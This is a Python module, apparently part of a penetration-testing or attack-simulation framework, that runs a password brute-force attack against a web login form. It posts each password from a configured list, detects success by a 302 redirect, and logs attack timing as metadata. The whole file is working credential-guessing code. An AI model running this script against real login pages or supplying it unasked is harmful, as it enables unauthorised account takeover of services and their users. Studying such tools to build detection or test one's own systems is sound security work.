import requests
import time
from utils.paths import get_paths
from data.pentest_utils import get_current_epoch, save_attack_metadata, get_retry_session

def run(config, metadata_path):
    url = config["base_url"] + config["login"]["path"]
    username = config["login"]["username"]
    passwords = config["login"]["passwords"]
    delay = config["login"]["sleep_between_requests"]
    timeout = config["login"].get("timeout", 15)  # default is 15

    session = get_retry_session()

    start_time = get_current_epoch()
    success_found = False

    for pwd in passwords:
        try:
            response = session.post(
                url, 
                data={"username": username, "password": pwd}, 
                timeout=timeout, 
                allow_redirects=False
            )

            if response.status_code == 302:
                print(f"[BruteForce] SUCCESS: Password found - '{pwd}' (Status: 302 Redirect)")
                success_found = True
                break
            else:
                print(f"[BruteForce] Failed attempt: {pwd} | Status: {response.status_code}")

        except Exception as e:
            print(f"[BruteForce] Error: {e}")

        time.sleep(delay)

    end_time = get_current_epoch()
    save_attack_metadata(metadata_path, "bruteforce", start_time, end_time)

    if not success_found:
        print("[BruteForce] No valid password found in the list.")
